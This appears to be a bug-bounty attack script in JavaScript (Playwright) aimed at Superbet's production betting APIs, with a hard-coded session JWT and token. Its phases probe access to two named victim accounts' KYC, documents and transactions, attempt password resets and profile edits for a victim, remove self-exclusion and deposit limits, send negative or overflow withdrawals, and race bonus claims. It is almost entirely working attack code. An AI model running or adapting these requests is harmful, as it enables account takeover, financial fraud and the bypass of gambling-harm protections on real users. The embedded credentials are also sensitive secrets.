/**
 * Superbet API Security Testing - Direct HTTP approach
 * Program: HackerOne #809, Engagement #51
 *
 * Uses Playwright's request API context to bypass CORS and test directly.
 * Also uses browser context to discover API calls from the SPA.
 */

const { chromium, request } = require('playwright');
const fs = require('fs');

// ── Config ──────────────────────────────────────────────────
const JWT = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEifQ.eyJ1c2VySWQiOjQ4MTYyMzUsInVzZXJVdWlkIjoiMzVjMzkzZTYtNTFlZi01ZmYwLWI4MTUtMTc1YmE1NzI2Mzc2IiwianVyaXNkaWN0aW9uS2V5Ijoicm8uUk8uUk8uc3VwZXJiZXQub25saW5lIiwiaWF0IjoxNzc2MDAxNjc2LCJleHAiOjE3NzYwMDg4NzYsImF1ZCI6ImludGVybmFsIiwiaXNzIjoic3VwZXJiZXQucm8ifQ.ShyZL7zDEZXo0BEw0ttwiXpSpuOlhWkD9WXb1lCvKp1f3EAhJC-KVUyaq43IVygmHR5cr42vfDgX5b9OyHee_p-usBTfje8TNn1rCSmtA_KcUa2ZQp-sTaDmyfR6dwqXiDWtDyELNRkAXQXWdODU15FKn9HQceXMmPPz4QlixSYPUN2JXvKWilaM7DGeo5wD7XvO-yUVVW2GRMy-7MkHe0S-TJLOW6EPXrzMba0ihOAUE3LT8cOlk98g2WV4xGBDGzlwNbdcYpuZMzCVL6ej9SzLD-V8yAqrlM6G53EN-gs7QcIpoGQ1phIaxZV82KJ8gJt174unaUwJ7gR_BqhOcQ';
const SESSION_TOKEN = '86b1b780-f66d-4f24-87f4-a90c4643a5a2';
const PLAYER_ID = '4816235';
const USER_UUID = '35c393e6-51ef-5ff0-b815-175ba5726376';

const VICTIM_IDS = ['1757082', '2113403'];
const VICTIM_UUIDS = ['aaaaaaaa-bbbb-cccc-dddd-000001757082', 'aaaaaaaa-bbbb-cccc-dddd-000002113403'];

const BASE_LEGACY = 'https://legacy-web.superbet.ro';
const BASE_API = 'https://api.web.production.betler.superbet.ro';
const BASE_LOYALTY = 'https://api-loyalty.content-prod.superbet.ro';

const COMMON_HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 hackerone',
  'Accept': 'application/json, text/plain, */*',
  'Accept-Language': 'ro-RO,ro;q=0.9,en;q=0.8',
  'Origin': 'https://superbet.ro',
  'Referer': 'https://superbet.ro/',
};

const results = { findings: [], tests: [] };

function log(section, msg) {
  const ts = new Date().toISOString().slice(11, 19);
  console.log(`[${ts}][${section}] ${msg}`);
}

function truncate(s, n = 500) { return s && s.length > n ? s.substring(0, n) + '...' : s; }

// ── Main ────────────────────────────────────────────────────
(async () => {
  log('INIT', 'Creating API request context...');

  const apiContext = await request.newContext({
    extraHTTPHeaders: COMMON_HEADERS,
  });

  // Helper to make authenticated requests
  async function authGet(url, extraHeaders = {}) {
    try {
      const resp = await apiContext.get(url, {
        headers: {
          'Cookie': `sb-production-token=${JWT}; sessionToken=${SESSION_TOKEN}`,
          ...extraHeaders,
        },
      });
      const body = await resp.text();
      return { status: resp.status(), body, headers: resp.headers() };
    } catch (e) {
      return { status: -1, body: e.message, headers: {} };
    }
  }

  async function authPost(url, data, extraHeaders = {}) {
    try {
      const resp = await apiContext.post(url, {
        headers: {
          'Cookie': `sb-production-token=${JWT}; sessionToken=${SESSION_TOKEN}`,
          'Content-Type': 'application/json',
          ...extraHeaders,
        },
        data: typeof data === 'string' ? data : JSON.stringify(data),
      });
      const body = await resp.text();
      return { status: resp.status(), body, headers: resp.headers() };
    } catch (e) {
      return { status: -1, body: e.message, headers: {} };
    }
  }

  // ── Phase 0: Verify session is active ────────────────────
  log('PHASE0', 'Verifying session...');
  const sessionCheck = await authGet(`${BASE_LEGACY}/session/checkLoginSession?clientSourceType=Mobile_new`);
  log('PHASE0', `Session check: ${sessionCheck.status} - ${truncate(sessionCheck.body, 200)}`);

  if (sessionCheck.status !== 200 || sessionCheck.body.includes('not logged')) {
    log('PHASE0', 'WARNING: Session may not be active. Continuing with tests anyway...');
  }

  // ── Phase 1: Enumerate all authenticated endpoints ───────
  log('PHASE1', 'Testing known authenticated endpoints...');

  const endpoints = [
    { name: 'checkLoginSession', url: `${BASE_LEGACY}/session/checkLoginSession?clientSourceType=Mobile_new` },
    { name: 'getKycDetails', url: `${BASE_LEGACY}/user/getKycDetails?clientSourceType=Mobile_new` },
    { name: 'getPlayerBalance', url: `${BASE_LEGACY}/user/getPlayerBalance?IncludeBonusProductType=true&IncludeExternalBalances=true&IncludeBonusType=true&clientSourceType=Mobile_new` },
    { name: 'getPlayerBonuses', url: `${BASE_LEGACY}/bonus/getPlayerBonuses?includeAwardConditionFulfilment=true&lang=ro-RO&clientSourceType=Mobile_new` },
    { name: 'getAvailableBonuses', url: `${BASE_LEGACY}/bonus/getAvailableBonuses?clientSourceType=Mobile_new` },
    { name: 'playerMissionProgress', url: `${BASE_API}/api/mobius/player-mission-progress` },
    { name: 'getPlayerDetails', url: `${BASE_LEGACY}/user/getPlayerDetails?clientSourceType=Mobile_new` },
    { name: 'getPlayerLimits', url: `${BASE_LEGACY}/responsibleGaming/getLimits?clientSourceType=Mobile_new` },
    { name: 'getPaymentMethods', url: `${BASE_LEGACY}/payment/getPaymentMethods?clientSourceType=Mobile_new` },
    { name: 'getTransactionHistory', url: `${BASE_LEGACY}/payment/getTransactionHistory?clientSourceType=Mobile_new&page=1&pageSize=10` },
    { name: 'getBetHistory', url: `${BASE_LEGACY}/bet/getBetHistory?clientSourceType=Mobile_new&page=1&pageSize=10` },
    { name: 'getMessages', url: `${BASE_LEGACY}/message/getMessages?clientSourceType=Mobile_new&page=1&pageSize=10` },
    { name: 'getSelfExclusionStatus', url: `${BASE_LEGACY}/responsibleGaming/getSelfExclusionStatus?clientSourceType=Mobile_new` },
    { name: 'getDepositLimits', url: `${BASE_LEGACY}/responsibleGaming/getDepositLimits?clientSourceType=Mobile_new` },
    { name: 'getPlayerPreferences', url: `${BASE_LEGACY}/user/getPlayerPreferences?clientSourceType=Mobile_new` },
    { name: 'getPlayerDocuments', url: `${BASE_LEGACY}/user/getPlayerDocuments?clientSourceType=Mobile_new` },
    { name: 'getBonusHistory', url: `${BASE_LEGACY}/bonus/getBonusHistory?clientSourceType=Mobile_new&page=1&pageSize=10` },
    { name: 'getWithdrawalMethods', url: `${BASE_LEGACY}/payment/getWithdrawalMethods?clientSourceType=Mobile_new` },
    // Betler API endpoints
    { name: 'betlerPlayerProfile', url: `${BASE_API}/api/player/profile` },
    { name: 'betlerPlayerSettings', url: `${BASE_API}/api/player/settings` },
    { name: 'betlerPlayerWallet', url: `${BASE_API}/api/wallet/balance` },
    { name: 'betlerPlayerBets', url: `${BASE_API}/api/player/bets?page=1&size=10` },
    // Loyalty API
    { name: 'loyaltyProfile', url: `${BASE_LOYALTY}/api/v1/loyalty/profile?user_uuid=${USER_UUID}` },
    { name: 'loyaltyPoints', url: `${BASE_LOYALTY}/api/v1/loyalty/points?user_uuid=${USER_UUID}` },
    { name: 'loyaltyRewards', url: `${BASE_LOYALTY}/api/v1/loyalty/rewards?user_uuid=${USER_UUID}` },
    { name: 'loyaltyHistory', url: `${BASE_LOYALTY}/api/v1/loyalty/history?user_uuid=${USER_UUID}` },
  ];

  const liveEndpoints = [];

  for (const ep of endpoints) {
    const resp = await authGet(ep.url);
    const isAuth = resp.status === 200 && !resp.body.includes('not logged') && !resp.body.includes('Unauthorized');
    log('PHASE1', `${ep.name}: ${resp.status} ${isAuth ? '[AUTH]' : '[NOAUTH]'} - ${truncate(resp.body, 150)}`);

    if (isAuth || (resp.status >= 200 && resp.status < 400)) {
      liveEndpoints.push({ ...ep, response: resp });
    }
    results.tests.push({ phase: 'endpoint_enum', name: ep.name, status: resp.status, authenticated: isAuth, body: truncate(resp.body, 300) });
  }

  log('PHASE1', `Live endpoints: ${liveEndpoints.length}/${endpoints.length}`);

  // ── Phase 2: IDOR Testing ────────────────────────────────
  log('PHASE2', 'Testing IDOR on live endpoints...');

  // Test with modified player IDs
  const idorEndpoints = [
    // Try accessing other player's data via playerId param
    { name: 'idor_balance', url: `${BASE_LEGACY}/user/getPlayerBalance?playerId=VICTIM_ID&IncludeBonusProductType=true&clientSourceType=Mobile_new` },
    { name: 'idor_kyc', url: `${BASE_LEGACY}/user/getKycDetails?playerId=VICTIM_ID&clientSourceType=Mobile_new` },
    { name: 'idor_details', url: `${BASE_LEGACY}/user/getPlayerDetails?playerId=VICTIM_ID&clientSourceType=Mobile_new` },
    { name: 'idor_bonuses', url: `${BASE_LEGACY}/bonus/getPlayerBonuses?playerId=VICTIM_ID&clientSourceType=Mobile_new` },
    { name: 'idor_bets', url: `${BASE_LEGACY}/bet/getBetHistory?playerId=VICTIM_ID&page=1&pageSize=10&clientSourceType=Mobile_new` },
    { name: 'idor_transactions', url: `${BASE_LEGACY}/payment/getTransactionHistory?playerId=VICTIM_ID&page=1&pageSize=10&clientSourceType=Mobile_new` },
    { name: 'idor_messages', url: `${BASE_LEGACY}/message/getMessages?playerId=VICTIM_ID&page=1&pageSize=10&clientSourceType=Mobile_new` },
    { name: 'idor_documents', url: `${BASE_LEGACY}/user/getPlayerDocuments?playerId=VICTIM_ID&clientSourceType=Mobile_new` },
    { name: 'idor_preferences', url: `${BASE_LEGACY}/user/getPlayerPreferences?playerId=VICTIM_ID&clientSourceType=Mobile_new` },
    { name: 'idor_limits', url: `${BASE_LEGACY}/responsibleGaming/getLimits?playerId=VICTIM_ID&clientSourceType=Mobile_new` },
    // Loyalty IDOR
    { name: 'idor_loyalty_profile', url: `${BASE_LOYALTY}/api/v1/loyalty/profile?user_uuid=VICTIM_UUID` },
    { name: 'idor_loyalty_points', url: `${BASE_LOYALTY}/api/v1/loyalty/points?user_uuid=VICTIM_UUID` },
    { name: 'idor_loyalty_rewards', url: `${BASE_LOYALTY}/api/v1/loyalty/rewards?user_uuid=VICTIM_UUID` },
  ];

  for (const ep of idorEndpoints) {
    for (let i = 0; i < VICTIM_IDS.length; i++) {
      const url = ep.url.replace('VICTIM_ID', VICTIM_IDS[i]).replace('VICTIM_UUID', VICTIM_UUIDS[i]);
      const resp = await authGet(url);

      const isVulnerable = resp.status === 200 &&
        !resp.body.includes('Security') &&
        !resp.body.includes('mismatch') &&
        !resp.body.includes('unauthorized') &&
        !resp.body.includes('Unauthorized') &&
        !resp.body.includes('forbidden') &&
        !resp.body.includes('not_authorized') &&
        resp.body.length > 10;

      log('PHASE2', `${ep.name} (victim=${VICTIM_IDS[i]}): ${resp.status} vuln=${isVulnerable} - ${truncate(resp.body, 150)}`);

      if (isVulnerable) {
        log('FINDING', `*** POTENTIAL IDOR: ${ep.name} ***`);
        results.findings.push({
          type: 'IDOR',
          name: ep.name,
          url,
          victimId: VICTIM_IDS[i],
          status: resp.status,
          response: truncate(resp.body, 1000),
        });
      }

      results.tests.push({ phase: 'idor', name: ep.name, victimId: VICTIM_IDS[i], status: resp.status, vulnerable: isVulnerable, body: truncate(resp.body, 300) });
    }
  }

  // POST-based IDOR
  const postIdorTests = [
    {
      name: 'idor_post_balance',
      url: `${BASE_LEGACY}/user/getPlayerBalance?clientSourceType=Mobile_new`,
      body: { playerId: 'VICTIM_ID' },
    },
    {
      name: 'idor_post_details',
      url: `${BASE_LEGACY}/user/getPlayerDetails?clientSourceType=Mobile_new`,
      body: { playerId: 'VICTIM_ID' },
    },
    {
      name: 'idor_post_bets',
      url: `${BASE_LEGACY}/bet/getBetHistory?clientSourceType=Mobile_new`,
      body: { playerId: 'VICTIM_ID', page: 1, pageSize: 10 },
    },
  ];

  for (const ep of postIdorTests) {
    for (const victimId of VICTIM_IDS) {
      const body = JSON.parse(JSON.stringify(ep.body).replace('VICTIM_ID', victimId));
      const resp = await authPost(ep.url, body);

      const isVulnerable = resp.status === 200 &&
        !resp.body.includes('Security') &&
        !resp.body.includes('mismatch') &&
        !resp.body.includes('not_authorized') &&
        resp.body.length > 10;

      log('PHASE2', `POST ${ep.name} (victim=${victimId}): ${resp.status} vuln=${isVulnerable} - ${truncate(resp.body, 150)}`);

      if (isVulnerable) {
        results.findings.push({
          type: 'IDOR_POST',
          name: ep.name,
          url: ep.url,
          body,
          victimId,
          status: resp.status,
          response: truncate(resp.body, 1000),
        });
      }
    }
  }

  // ── Phase 3: Password Change Testing ────────────────────
  log('PHASE3', 'Testing password change...');

  const pwTests = [
    {
      name: 'change_pw_no_old',
      url: `${BASE_LEGACY}/user/changePassword?clientSourceType=Mobile_new`,
      body: { newPassword: 'TestPw123!@#', confirmPassword: 'TestPw123!@#' },
    },
    {
      name: 'change_pw_empty_old',
      url: `${BASE_LEGACY}/user/changePassword?clientSourceType=Mobile_new`,
      body: { oldPassword: '', newPassword: 'TestPw123!@#', confirmPassword: 'TestPw123!@#' },
    },
    {
      name: 'change_pw_wrong_old',
      url: `${BASE_LEGACY}/user/changePassword?clientSourceType=Mobile_new`,
      body: { oldPassword: 'wrongpassword123', newPassword: 'TestPw123!@#', confirmPassword: 'TestPw123!@#' },
    },
    {
      name: 'reset_pw_for_victim',
      url: `${BASE_LEGACY}/user/changePassword?clientSourceType=Mobile_new`,
      body: { playerId: VICTIM_IDS[0], newPassword: 'TestPw123!@#', confirmPassword: 'TestPw123!@#' },
    },
  ];

  for (const test of pwTests) {
    const resp = await authPost(test.url, test.body);
    log('PHASE3', `${test.name}: ${resp.status} - ${truncate(resp.body, 200)}`);
    results.tests.push({ phase: 'password', ...test, response: { status: resp.status, body: truncate(resp.body, 500) } });

    if (resp.status === 200 && !resp.body.toLowerCase().includes('error') && !resp.body.toLowerCase().includes('invalid') && !resp.body.toLowerCase().includes('oldpassword')) {
      results.findings.push({ type: 'AUTH_BYPASS', name: test.name, url: test.url, body: test.body, response: truncate(resp.body, 1000) });
    }
  }

  // ── Phase 4: Self-Exclusion Testing ──────────────────────
  log('PHASE4', 'Testing self-exclusion/responsible gaming...');

  const exclusionTests = [
    {
      name: 'remove_self_exclusion',
      method: 'POST',
      url: `${BASE_LEGACY}/responsibleGaming/removeSelfExclusion?clientSourceType=Mobile_new`,
      body: { playerId: PLAYER_ID },
    },
    {
      name: 'cancel_cooloff',
      method: 'POST',
      url: `${BASE_LEGACY}/responsibleGaming/cancelCoolOff?clientSourceType=Mobile_new`,
      body: {},
    },
    {
      name: 'remove_limit',
      method: 'POST',
      url: `${BASE_LEGACY}/responsibleGaming/removeLimit?clientSourceType=Mobile_new`,
      body: { limitType: 'deposit', period: 'daily' },
    },
    {
      name: 'set_max_limit',
      method: 'POST',
      url: `${BASE_LEGACY}/responsibleGaming/setLimit?clientSourceType=Mobile_new`,
      body: { limitType: 'deposit', period: 'daily', amount: 999999999 },
    },
    {
      name: 'get_exclusion_status',
      method: 'GET',
      url: `${BASE_LEGACY}/responsibleGaming/getSelfExclusionStatus?clientSourceType=Mobile_new`,
      body: null,
    },
    {
      name: 'get_limits',
      method: 'GET',
      url: `${BASE_LEGACY}/responsibleGaming/getLimits?clientSourceType=Mobile_new`,
      body: null,
    },
  ];

  for (const test of exclusionTests) {
    let resp;
    if (test.method === 'GET') {
      resp = await authGet(test.url);
    } else {
      resp = await authPost(test.url, test.body);
    }
    log('PHASE4', `${test.name}: ${resp.status} - ${truncate(resp.body, 200)}`);
    results.tests.push({ phase: 'exclusion', ...test, response: { status: resp.status, body: truncate(resp.body, 500) } });
  }

  // ── Phase 5: Financial Manipulation ──────────────────────
  log('PHASE5', 'Testing financial manipulation...');

  const financialTests = [
    {
      name: 'negative_withdrawal',
      url: `${BASE_LEGACY}/payment/initiateWithdrawal?clientSourceType=Mobile_new`,
      body: { amount: -100, paymentMethodId: 1 },
    },
    {
      name: 'zero_withdrawal',
      url: `${BASE_LEGACY}/payment/initiateWithdrawal?clientSourceType=Mobile_new`,
      body: { amount: 0, paymentMethodId: 1 },
    },
    {
      name: 'float_precision_withdrawal',
      url: `${BASE_LEGACY}/payment/initiateWithdrawal?clientSourceType=Mobile_new`,
      body: { amount: 0.0000001, paymentMethodId: 1 },
    },
    {
      name: 'negative_deposit',
      url: `${BASE_LEGACY}/payment/initiateDeposit?clientSourceType=Mobile_new`,
      body: { amount: -50, paymentMethodId: 1 },
    },
    {
      name: 'overflow_deposit',
      url: `${BASE_LEGACY}/payment/initiateDeposit?clientSourceType=Mobile_new`,
      body: { amount: 9999999999999, paymentMethodId: 1 },
    },
    {
      name: 'string_amount_deposit',
      url: `${BASE_LEGACY}/payment/initiateDeposit?clientSourceType=Mobile_new`,
      body: { amount: '100abc', paymentMethodId: 1 },
    },
    {
      name: 'cancel_pending_withdrawal',
      url: `${BASE_LEGACY}/payment/cancelWithdrawal?clientSourceType=Mobile_new`,
      body: { withdrawalId: 99999999 },
    },
  ];

  for (const test of financialTests) {
    const resp = await authPost(test.url, test.body);
    log('PHASE5', `${test.name}: ${resp.status} - ${truncate(resp.body, 200)}`);
    results.tests.push({ phase: 'financial', ...test, response: { status: resp.status, body: truncate(resp.body, 500) } });

    // Dangerous if accepted
    if (resp.status === 200 && !resp.body.toLowerCase().includes('error') && !resp.body.toLowerCase().includes('invalid')) {
      results.findings.push({ type: 'FINANCIAL', name: test.name, url: test.url, body: test.body, response: truncate(resp.body, 1000) });
    }
  }

  // ── Phase 6: Bonus Testing ───────────────────────────────
  log('PHASE6', 'Testing bonus operations...');

  // First get available bonuses
  const bonusList = await authGet(`${BASE_LEGACY}/bonus/getAvailableBonuses?clientSourceType=Mobile_new`);
  log('PHASE6', `Available bonuses: ${bonusList.status} - ${truncate(bonusList.body, 300)}`);

  const bonusTests = [
    {
      name: 'claim_invalid_bonus',
      url: `${BASE_LEGACY}/bonus/claimBonus?clientSourceType=Mobile_new`,
      body: { bonusId: 999999999 },
    },
    {
      name: 'claim_bonus_other_player',
      url: `${BASE_LEGACY}/bonus/claimBonus?clientSourceType=Mobile_new`,
      body: { bonusId: 1, playerId: VICTIM_IDS[0] },
    },
    {
      name: 'claim_bonus_modified_amount',
      url: `${BASE_LEGACY}/bonus/claimBonus?clientSourceType=Mobile_new`,
      body: { bonusId: 1, amount: 99999 },
    },
    {
      name: 'activate_promo_code',
      url: `${BASE_LEGACY}/bonus/activatePromoCode?clientSourceType=Mobile_new`,
      body: { promoCode: 'TESTPROMO123' },
    },
    {
      name: 'forfeit_bonus_other_player',
      url: `${BASE_LEGACY}/bonus/forfeitBonus?clientSourceType=Mobile_new`,
      body: { bonusId: 1, playerId: VICTIM_IDS[0] },
    },
  ];

  for (const test of bonusTests) {
    const resp = await authPost(test.url, test.body);
    log('PHASE6', `${test.name}: ${resp.status} - ${truncate(resp.body, 200)}`);
    results.tests.push({ phase: 'bonus', ...test, response: { status: resp.status, body: truncate(resp.body, 500) } });
  }

  // ── Phase 7: Race Conditions (via parallel requests) ─────
  log('PHASE7', 'Testing race conditions...');

  // Parse any claimable bonus
  let claimableBonusId = null;
  try {
    const bonusData = JSON.parse(bonusList.body);
    if (Array.isArray(bonusData) && bonusData.length > 0) {
      claimableBonusId = bonusData[0].id || bonusData[0].bonusId || bonusData[0].Id;
      log('PHASE7', `Found claimable bonus: ${claimableBonusId}`);
    }
  } catch {}

  if (claimableBonusId) {
    // Race condition: claim same bonus 20 times simultaneously
    log('PHASE7', `Racing bonus claim: ${claimableBonusId}`);
    const racePromises = Array.from({ length: 20 }, () =>
      authPost(`${BASE_LEGACY}/bonus/claimBonus?clientSourceType=Mobile_new`, { bonusId: claimableBonusId })
    );
    const raceResults = await Promise.all(racePromises);
    const successes = raceResults.filter(r => r.status === 200 && !r.body.toLowerCase().includes('error'));
    log('PHASE7', `Bonus race: ${successes.length}/20 successes`);
    results.tests.push({ phase: 'race', type: 'bonus_claim', total: 20, successes: successes.length, sample: raceResults.slice(0, 3).map(r => ({ status: r.status, body: truncate(r.body, 200) })) });

    if (successes.length > 1) {
      results.findings.push({ type: 'RACE_CONDITION', desc: `Bonus ${claimableBonusId} claimed ${successes.length} times`, responses: successes.slice(0, 3).map(r => truncate(r.body, 300)) });
    }
  }

  // ── Phase 8: Betler API IDOR ─────────────────────────────
  log('PHASE8', 'Testing Betler API gateway...');

  const betlerTests = [
    { name: 'betler_profile', url: `${BASE_API}/api/player/profile` },
    { name: 'betler_wallet', url: `${BASE_API}/api/wallet/balance` },
    { name: 'betler_bets', url: `${BASE_API}/api/player/bets?page=1&size=10` },
    { name: 'betler_missions', url: `${BASE_API}/api/mobius/player-mission-progress` },
    { name: 'betler_notifications', url: `${BASE_API}/api/notifications` },
    { name: 'betler_favorites', url: `${BASE_API}/api/player/favorites` },
    { name: 'betler_settings', url: `${BASE_API}/api/player/settings` },
    { name: 'betler_limits', url: `${BASE_API}/api/responsible-gaming/limits` },
  ];

  // First with our own token
  for (const ep of betlerTests) {
    const resp = await authGet(ep.url, { 'Authorization': `Bearer ${JWT}` });
    log('PHASE8', `${ep.name}: ${resp.status} - ${truncate(resp.body, 150)}`);
    results.tests.push({ phase: 'betler', ...ep, status: resp.status, body: truncate(resp.body, 300) });
  }

  // ── Phase 9: Additional attack vectors ───────────────────
  log('PHASE9', 'Testing additional vectors...');

  // Test email change without password
  const emailTests = [
    {
      name: 'change_email_no_pw',
      url: `${BASE_LEGACY}/user/updateEmail?clientSourceType=Mobile_new`,
      body: { email: 'test@test.com' },
    },
    {
      name: 'change_phone_no_verify',
      url: `${BASE_LEGACY}/user/updatePhone?clientSourceType=Mobile_new`,
      body: { phone: '+40700000000' },
    },
    {
      name: 'update_profile_other_user',
      url: `${BASE_LEGACY}/user/updatePlayerDetails?clientSourceType=Mobile_new`,
      body: { playerId: VICTIM_IDS[0], firstName: 'Hacked' },
    },
  ];

  for (const test of emailTests) {
    const resp = await authPost(test.url, test.body);
    log('PHASE9', `${test.name}: ${resp.status} - ${truncate(resp.body, 200)}`);
    results.tests.push({ phase: 'account_takeover', ...test, response: { status: resp.status, body: truncate(resp.body, 500) } });
  }

  // ── Phase 10: Browser-based discovery ────────────────────
  log('PHASE10', 'Launching browser for JS-level API discovery...');

  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext({
    userAgent: COMMON_HEADERS['User-Agent'],
    locale: 'ro-RO',
  });

  await context.addCookies([
    { name: 'sb-production-token', value: JWT, domain: '.superbet.ro', path: '/', secure: true, sameSite: 'Lax' },
    { name: 'sessionToken', value: SESSION_TOKEN, domain: '.superbet.ro', path: '/', secure: true, sameSite: 'Lax' },
    { name: 'CookieConsent', value: '{stamp:%27required%27}', domain: '.superbet.ro', path: '/', secure: false, sameSite: 'Lax' },
  ]);

  const page = await context.newPage();
  const discoveredApis = new Set();

  page.on('request', req => {
    const url = req.url();
    if ((url.includes('legacy-web') || url.includes('betler') || url.includes('loyalty')) &&
        !url.includes('.js') && !url.includes('.css')) {
      discoveredApis.add(`${req.method()} ${url}`);
    }
  });

  // Navigate key pages
  const pagesToVisit = [
    'https://superbet.ro/cont/profil',
    'https://superbet.ro/cont/setari',
    'https://superbet.ro/cont/depunere',
    'https://superbet.ro/cont/retragere',
    'https://superbet.ro/cont/istoric-pariuri',
    'https://superbet.ro/cont/joc-responsabil',
    'https://superbet.ro/cont/bonusuri',
    'https://superbet.ro/cont/tranzactii',
  ];

  for (const url of pagesToVisit) {
    try {
      await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 15000 });
      await page.waitForTimeout(3000);
    } catch {}
  }

  log('PHASE10', `Discovered ${discoveredApis.size} unique API calls from browser:`);
  for (const api of discoveredApis) {
    log('PHASE10', `  ${api}`);
  }
  results.tests.push({ phase: 'browser_discovery', apis: [...discoveredApis] });

  await browser.close();

  // ── Summary ──────────────────────────────────────────────
  log('SUMMARY', '═══════════════════════════════════════════');
  log('SUMMARY', `Total tests run: ${results.tests.length}`);
  log('SUMMARY', `Findings: ${results.findings.length}`);
  for (const f of results.findings) {
    log('SUMMARY', `  [${f.type}] ${f.name || f.desc}`);
  }

  // Save results
  const outputPath = '/Users/jmartinez/repos/julius/tools/playwright/superbet_results.json';
  fs.writeFileSync(outputPath, JSON.stringify(results, null, 2));
  log('DONE', `Results saved to ${outputPath}`);

  await apiContext.dispose();
})();
